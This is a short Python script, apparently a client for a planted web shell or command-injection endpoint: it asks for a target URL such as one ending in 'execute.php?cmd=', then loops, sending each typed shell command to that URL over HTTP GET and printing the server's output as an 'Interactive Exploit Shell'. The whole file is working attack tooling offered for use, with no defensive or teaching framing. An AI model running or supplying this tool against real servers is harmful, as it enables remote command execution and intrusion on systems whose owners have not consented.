import requests

# Colors
reset   = "\033[0m"
rouge   = "\033[31m"
vert    = "\033[32m"
jaune   = "\033[33m"
bleu    = "\033[34m"
magenta = "\033[35m"
cyan    = "\033[36m"
gris    = "\033[37m"
gras    = "\033[1m"
soul    = "\033[4m"

def getting_shell():
    print(f"{vert}[+]{reset} TARGET URL {gris}https://example.com/execute.php?cmd={reset}")
    target_url = input(f"{cyan}Enter target URL > {reset}")
    
    print(f"{bleu}[+]{reset} Interactive Exploit Shell - type {jaune}exit{reset} to quit.")
    
    while True:
        try:
            cmd = input(f"{magenta}$ {reset}")
            if cmd.lower() in ["exit", "quit", "stop"]:
                print(f"{rouge}Quitting...{reset}")
                break

            response = requests.get(target_url + cmd)
            
            if response.status_code == 200:
                print(f"{gris}{response.text.strip()}{reset}")
            else:
                print(f"{rouge}[-] Exploit Failed (status {response.status_code}){reset}")
        except KeyboardInterrupt:
            print(f"\n{rouge}[!] Ctrl + C detected . Closing...{reset}")
            break
        except Exception as e:
            print(f"{rouge}[!] Error : {str(e)}{reset}")

if __name__ == "__main__":
    getting_shell()
